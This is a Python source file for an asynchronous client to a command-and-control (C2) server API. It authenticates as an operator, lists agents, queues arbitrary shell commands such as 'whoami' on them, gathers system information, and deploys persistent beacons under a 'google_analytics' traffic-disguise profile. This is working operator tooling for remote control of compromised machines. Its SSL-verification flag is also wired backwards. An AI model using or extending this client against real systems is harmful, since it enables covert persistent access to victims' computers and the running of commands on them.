#!/usr/bin/env python3
"""
Python client for C2 API
"""
import aiohttp
import asyncio
import json
from typing import Dict, List, Optional
from dataclasses import dataclass

@dataclass
class C2ClientConfig:
    """C2 API client configuration"""
    base_url: str = "http://localhost:8080"
    username: str = "operator"
    password: str = "password"
    verify_ssl: bool = False

class C2APIClient:
    """Python client for C2 API"""
    
    def __init__(self, config: C2ClientConfig):
        self.config = config
        self.base_url = config.base_url
        self.access_token = None
        self.refresh_token = None
        self.session = None
    
    async def __aenter__(self):
        await self.connect()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()
    
    async def connect(self):
        """Connect to C2 API and authenticate"""
        self.session = aiohttp.ClientSession()
        await self.authenticate()
    
    async def close(self):
        """Close the client session"""
        if self.session:
            await self.session.close()
    
    async def authenticate(self):
        """Authenticate with the C2 API"""
        auth_data = {
            'username': self.config.username,
            'password': self.config.password
        }
        
        async with self.session.post(
            f"{self.base_url}/api/auth/login",
            json=auth_data,
            ssl=not self.config.verify_ssl
        ) as response:
            
            if response.status == 200:
                data = await response.json()
                self.access_token = data['access_token']
                self.refresh_token = data['refresh_token']
                print("✅ Authenticated successfully")
            else:
                raise Exception(f"Authentication failed: {response.status}")
    
    async def refresh_auth(self):
        """Refresh authentication token"""
        refresh_data = {
            'refresh_token': self.refresh_token
        }
        
        async with self.session.post(
            f"{self.base_url}/api/auth/refresh",
            json=refresh_data,
            ssl=not self.config.verify_ssl
        ) as response:
            
            if response.status == 200:
                data = await response.json()
                self.access_token = data['access_token']
            else:
                # Try to re-authenticate
                await self.authenticate()
    
    def get_headers(self) -> Dict[str, str]:
        """Get authenticated request headers"""
        return {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }
    
    async def request(self, method: str, endpoint: str, **kwargs) -> Dict:
        """Make authenticated request to API"""
        url = f"{self.base_url}{endpoint}"
        
        # Ensure headers are set
        if 'headers' not in kwargs:
            kwargs['headers'] = self.get_headers()
        
        async with self.session.request(
            method, url, ssl=not self.config.verify_ssl, **kwargs
        ) as response:
            
            if response.status == 401:
                # Token expired, try to refresh
                await self.refresh_auth()
                kwargs['headers'] = self.get_headers()
                
                async with self.session.request(
                    method, url, ssl=not self.config.verify_ssl, **kwargs
                ) as retry_response:
                    
                    if retry_response.status == 200:
                        return await retry_response.json()
                    else:
                        raise Exception(f"Request failed after refresh: {retry_response.status}")
            
            elif response.status == 200:
                return await response.json()
            else:
                raise Exception(f"Request failed: {response.status}")
    
    # Agent operations
    async def get_agents(self) -> List[Dict]:
        """Get list of all agents"""
        return await self.request('GET', '/api/agents')
    
    async def get_agent(self, agent_id: str) -> Dict:
        """Get specific agent details"""
        return await self.request('GET', f'/api/agents/{agent_id}')
    
    async def create_task(self, agent_id: str, command: str, arguments: Dict = None) -> Dict:
        """Create task for agent"""
        task_data = {
            'command': command,
            'arguments': arguments or {}
        }
        return await self.request('POST', f'/api/agents/{agent_id}/tasks', json=task_data)
    
    # Task operations
    async def get_tasks(self) -> List[Dict]:
        """Get list of all tasks"""
        return await self.request('GET', '/api/tasks')
    
    async def get_task(self, task_id: str) -> Dict:
        """Get specific task details"""
        return await self.request('GET', f'/api/tasks/{task_id}')
    
    # Dashboard operations
    async def get_dashboard_stats(self) -> Dict:
        """Get dashboard statistics"""
        return await self.request('GET', '/api/dashboard/stats')
    
    # Example usage methods
    async def deploy_beacon(self, target_platform: str, profile: str = "google_analytics") -> Dict:
        """Deploy beacon to target platform"""
        task_data = {
            'command': 'deploy_beacon',
            'arguments': {
                'platform': target_platform,
                'profile': profile,
                'persistence': True
            }
        }
        
        # This would target a specific agent capable of deployment
        agents = await self.get_agents()
        if agents:
            agent_id = agents[0]['agent_id']
            return await self.create_task(agent_id, 'deploy_beacon', task_data['arguments'])
        else:
            raise Exception("No agents available for deployment")
    
    async def execute_command(self, agent_id: str, command: str, args: List[str] = None) -> Dict:
        """Execute command on agent"""
        return await self.create_task(agent_id, 'execute', {
            'command': command,
            'arguments': args or []
        })
    
    async def collect_system_info(self, agent_id: str) -> Dict:
        """Collect system information from agent"""
        return await self.create_task(agent_id, 'system_info')

# Example usage
async def main():
    """Example usage of C2 API client"""
    config = C2ClientConfig(
        base_url="https://c2-api.example.com",
        username="operator",
        password="secure_password"
    )
    
    async with C2APIClient(config) as client:
        try:
            # Get dashboard statistics
            stats = await client.get_dashboard_stats()
            print(f"Dashboard stats: {stats}")
            
            # List all agents
            agents = await client.get_agents()
            print(f"Agents: {len(agents)}")
            
            # Execute command on first agent
            if agents:
                agent_id = agents[0]['agent_id']
                task = await client.execute_command(agent_id, 'whoami')
                print(f"Task created: {task}")
            
        except Exception as e:
            print(f"API client error: {e}")

if __name__ == "__main__":
    asyncio.run(main())